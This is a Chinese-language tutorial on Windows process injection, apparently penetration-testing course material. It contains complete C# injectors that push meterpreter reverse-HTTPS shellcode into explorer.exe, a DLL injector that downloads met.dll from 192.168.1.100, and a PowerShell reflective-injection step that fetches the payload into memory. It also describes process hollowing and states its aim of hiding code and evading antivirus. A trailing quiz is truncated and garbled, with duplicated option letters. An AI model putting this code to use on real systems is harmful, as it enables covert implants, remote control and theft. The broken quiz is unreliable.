# 进程注入与迁移 - 完整指南

## 写在前面

进程注入是高级渗透测试中的核心技术。通过将代码注入到其他进程中，我们可以：
- 隐藏恶意代码的来源
- 在目标进程关闭后保持持久性
- 绕过基于进程的安全检测

**Web 安全类比**：
- 进程注入就像是 XSS 攻击，将恶意代码注入到"受信任"的上下文中执行
- DLL 注入就像是在网页中加载恶意的外部 JavaScript 文件

---

## 第一部分：进程注入基础理论

### 1.1 什么是进程和线程？

```
进程 (Process)
┌─────────────────────────────────────────────────────────────┐
│  进程是运行中程序的容器                                      │
│  每个进程有自己独立的虚拟内存空间                            │
│                                                             │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │  线程 1     │  │  线程 2     │  │  线程 3     │         │
│  │  执行代码   │  │  执行代码   │  │  执行代码   │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
│                                                             │
│  共享内存空间                                                │
└─────────────────────────────────────────────────────────────┘

线程 (Thread)
- 线程是进程中实际执行代码的单元
- 一个进程可以有多个线程
- 线程共享进程的内存空间
```

### 1.2 为什么需要进程注入？

| 问题 | 解决方案 |
|------|----------|
| 用户关闭 Word 文档 | 注入到 explorer.exe，它不会被关闭 |
| 杀软检测 Word 的网络连接 | 注入到 svchost.exe，它本来就有网络连接 |
| 进程被终止 | 注入到系统关键进程，难以被终止 |

### 1.3 进程注入的基本流程

```
┌─────────────────────────────────────────────────────────────┐
│  1. OpenProcess - 打开目标进程                              │
│     获取目标进程的句柄                                       │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  2. VirtualAllocEx - 在目标进程中分配内存                   │
│     分配可执行的内存空间                                     │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  3. WriteProcessMemory - 写入 shellcode                     │
│     将 shellcode 复制到目标进程的内存中                      │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  4. CreateRemoteThread - 创建远程线程                       │
│     在目标进程中创建新线程执行 shellcode                     │
└─────────────────────────────────────────────────────────────┘
```

### 1.4 关键 Win32 API

| API | 作用 | 所在 DLL |
|-----|------|----------|
| `OpenProcess` | 打开目标进程，获取句柄 | kernel32.dll |
| `VirtualAllocEx` | 在远程进程中分配内存 | kernel32.dll |
| `WriteProcessMemory` | 向远程进程写入数据 | kernel32.dll |
| `CreateRemoteThread` | 在远程进程中创建线程 | kernel32.dll |

## 第二部分：权限和完整性级别

### 2.1 进程安全描述符

每个进程都有安全描述符，定义了：
- 哪些用户/组可以访问该进程
- 允许的访问权限（读、写、执行等）

### 2.2 完整性级别 (Integrity Level)

```
完整性级别层次：
┌─────────────────────────────────────────────────────────────┐
│  System (系统)     - 最高级别，系统服务                      │
├─────────────────────────────────────────────────────────────┤
│  High (高)         - 管理员权限进程                          │
├─────────────────────────────────────────────────────────────┤
│  Medium (中)       - 普通用户进程（默认）                    │
├─────────────────────────────────────────────────────────────┤
│  Low (低)          - 受限进程（如浏览器沙箱）                │
├─────────────────────────────────────────────────────────────┤
│  Untrusted (不信任) - 最低级别                               │
└─────────────────────────────────────────────────────────────┘

规则：只能注入到相同或更低完整性级别的进程
```

### 2.3 选择注入目标

| 目标进程 | 优点 | 缺点 |
|----------|------|------|
| `explorer.exe` | 始终运行，用户不会关闭 | 可能被监控 |
| `svchost.exe` | 本来就有网络连接 | 需要更高权限 |
| `notepad.exe` | 简单，容易注入 | 用户可能关闭 |
| `iexplore.exe` | 网络连接正常 | 可能不存在 |

### 3.2 完整的进程注入代码

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            // ===== 步骤 1: 获取目标进程 ID =====
            // 动态获取 explorer.exe 的进程 ID
            Process[] expProc = Process.GetProcessesByName("explorer");
            if (expProc.Length == 0)
            {
                Console.WriteLine("[-] explorer.exe not found");
                return;
            }
            int pid = expProc[0].Id;
            Console.WriteLine("[+] Target PID: " + pid);

            // ===== 步骤 2: 打开目标进程 =====
            // 0x001F0FFF = PROCESS_ALL_ACCESS
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open process");
                return;
            }
            Console.WriteLine("[+] Process handle: " + hProcess);

            // ===== 步骤 3: 在目标进程中分配内存 =====
            // 0x3000 = MEM_COMMIT | MEM_RESERVE
            // 0x40 = PAGE_EXECUTE_READWRITE
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory");
                return;
            }
            Console.WriteLine("[+] Allocated memory at: 0x" + addr.ToString("X"));

            // ===== 步骤 4: Shellcode =====
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f csharp
            byte[] buf = new byte[626] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                // ... 替换为你的 shellcode ...
                0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
            };

            // ===== 步骤 5: 写入 shellcode =====
            IntPtr outSize;
            bool result = WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            if (!result)
            {
                Console.WriteLine("[-] Failed to write memory");
                return;
            }
            Console.WriteLine("[+] Wrote " + outSize + " bytes");

            // ===== 步骤 6: 创建远程线程 =====
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create remote thread");
                return;
            }
            Console.WriteLine("[+] Remote thread created: " + hThread);
            Console.WriteLine("[+] Injection complete!");
        }
    }
}
```

### 3.3 代码详解

#### OpenProcess 参数

```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
```

| 参数 | 值 | 说明 |
|------|-----|------|
| `processAccess` | `0x001F0FFF` | PROCESS_ALL_ACCESS，完全访问权限 |
| `bInheritHandle` | `false` | 子进程不继承此句柄 |
| `processId` | `pid` | 目标进程 ID |

#### VirtualAllocEx 参数

```csharp
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
```

| 参数 | 值 | 说明 |
|------|-----|------|
| `hProcess` | 进程句柄 | 从 OpenProcess 获得 |
| `lpAddress` | `IntPtr.Zero` | 让系统选择地址 |
| `dwSize` | `0x1000` | 4096 字节 |
| `flAllocationType` | `0x3000` | MEM_COMMIT \| MEM_RESERVE |
| `flProtect` | `0x40` | PAGE_EXECUTE_READWRITE |

## 第四部分：DLL 注入

### 4.1 DLL 注入原理

```
DLL 注入流程：
┌─────────────────────────────────────────────────────────────┐
│  1. 将 DLL 路径写入目标进程内存                              │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  2. 获取 LoadLibraryA 的地址                                │
│     （kernel32.dll 在所有进程中地址相同）                    │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  3. CreateRemoteThread 调用 LoadLibraryA                    │
│     参数是 DLL 路径的地址                                    │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  4. LoadLibraryA 加载 DLL，执行 DllMain                     │
│     DllMain 中的代码被执行                                   │
└─────────────────────────────────────────────────────────────┘
```

### 4.2 DllMain 函数

```cpp
// DLL 的入口点
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // DLL 被加载时执行
        // 在这里放置 shellcode 执行代码！
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

### 4.4 C# DLL 注入代码

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace DLLInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            // ===== 步骤 1: 下载 DLL =====
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.1.100/met.dll", dllName);
            Console.WriteLine("[+] Downloaded DLL to: " + dllName);

            // ===== 步骤 2: 获取目标进程 =====
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            Console.WriteLine("[+] Target PID: " + pid);

            // ===== 步骤 3: 打开进程 =====
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            // ===== 步骤 4: 分配内存并写入 DLL 路径 =====
            // LoadLibraryA 读取的是 NUL 结尾的 ANSI 字符串
            byte[] dllPathBytes = Encoding.ASCII.GetBytes(dllName + "\0");
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length, 0x3000, 0x40);
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, dllPathBytes,
                dllPathBytes.Length, out outSize);
            Console.WriteLine("[+] Wrote DLL path to remote process");

            // ===== 步骤 5: 获取 LoadLibraryA 地址 =====
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            Console.WriteLine("[+] LoadLibraryA at: 0x" + loadLib.ToString("X"));

            // ===== 步骤 6: 创建远程线程调用 LoadLibraryA =====
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib,
                addr, 0, IntPtr.Zero);
            Console.WriteLine("[+] DLL injection complete!");
        }
    }
}
```

## 第五部分：反射式 DLL 注入

### 5.1 为什么需要反射式 DLL 注入？

普通 DLL 注入的问题：
- DLL 必须写入磁盘
- DLL 会被 Process Explorer 等工具检测到
- 杀软可以扫描磁盘上的 DLL

反射式 DLL 注入的优势：
- DLL 不需要写入磁盘
- DLL 不会被注册，难以检测
- 完全在内存中执行

### 5.2 反射式 DLL 注入原理

```
普通 DLL 注入：
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│ DLL 在磁盘  │────▶│ LoadLibrary │────▶│ DLL 被加载  │
└─────────────┘     └─────────────┘     └─────────────┘
                          │
                          ▼
                    DLL 被注册，可被检测

反射式 DLL 注入：
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│ DLL 在内存  │────▶│ 手动解析 PE │────▶│ DLL 被加载  │
└─────────────┘     └─────────────┘     └─────────────┘
                          │
                          ▼
                    DLL 不被注册，难以检测
```

### 5.3 使用 Invoke-ReflectivePEInjection

```powershell
# 步骤 1: 下载 DLL 到内存（不写入磁盘）
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.100/met.dll')

# 步骤 2: 获取目标进程 ID
$procid = (Get-Process -Name explorer).Id

# 步骤 3: 导入脚本
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1

# 步骤 4: 执行反射式注入
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

### 5.4 反射式注入的工作原理

```
1. 下载 DLL 到内存（字节数组）
   ↓
2. 解析 PE 文件头
   - DOS Header
   - PE Header
   - Section Headers
   ↓
3. 在目标进程中分配内存
   ↓
4. 复制 PE 各个节到目标进程
   ↓
5. 处理导入表（解析依赖的 DLL）
   ↓
6. 处理重定位表（修复地址）
   ↓
7. 调用 DllMain（DLL_PROCESS_ATTACH）
```

## 第六部分：进程镂空 (Process Hollowing)

### 6.1 什么是进程镂空？

进程镂空是一种更高级的技术：
1. 创建一个合法进程（如 svchost.exe）但暂停执行
2. 清空该进程的内存
3. 将恶意代码写入
4. 恢复执行

### 6.2 进程镂空流程

```
┌─────────────────────────────────────────────────────────────┐
│  1. CreateProcess (CREATE_SUSPENDED)                        │
│     创建暂停的进程                                           │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  2. NtUnmapViewOfSection                                    │
│     清空进程的内存映像                                       │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  3. VirtualAllocEx + WriteProcessMemory                     │
│     写入恶意 PE 文件                                         │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  4. SetThreadContext                                        │
│     修改入口点指向恶意代码                                   │
└─────────────────────────────────┬───────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│  5. ResumeThread                                            │
│     恢复执行，运行恶意代码                                   │
└─────────────────────────────────────────────────────────────┘
```

### 6.3 进程镂空的优势

| 特性 | 说明 |
|------|------|
| 进程名合法 | 看起来是正常的系统进程 |
| 签名有效 | 进程的数字签名仍然有效 |
| 难以检测 | 内存中的代码与磁盘不匹配 |

## 第七部分：注入路径兼容性

### 7.1 32 位 vs 64 位

| 源进程 | 目标进程 | 是否可行 |
|--------|----------|----------|
| 64-bit | 64-bit | ✅ 可行 |
| 64-bit | 32-bit | ✅ 可行 |
| 32-bit | 32-bit | ✅ 可行 |
| 32-bit | 64-bit | ❌ 不可行 |

**注意**：32 位进程无法使用 CreateRemoteThread 注入到 64 位进程。

### 7.2 检查进程架构

```csharp
// 检查进程是否为 64 位
[DllImport("kernel32.dll", SetLastError = true)]
static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

bool Is64BitProcess(IntPtr hProcess)
{
    if (!Environment.Is64BitOperatingSystem)
        return false;

    bool isWow64;
    if (!IsWow64Process(hProcess, out isWow64))
        return false;
    return !isWow64;  // 64 位 OS 上，不是 WOW64 的目标进程才是 64 位
}
```

### 选择题

1. 进程注入中，哪个 API 用于在远程进程中分配内存？
   - A) VirtualAlloc

   - A) 只能注入到 High 级别
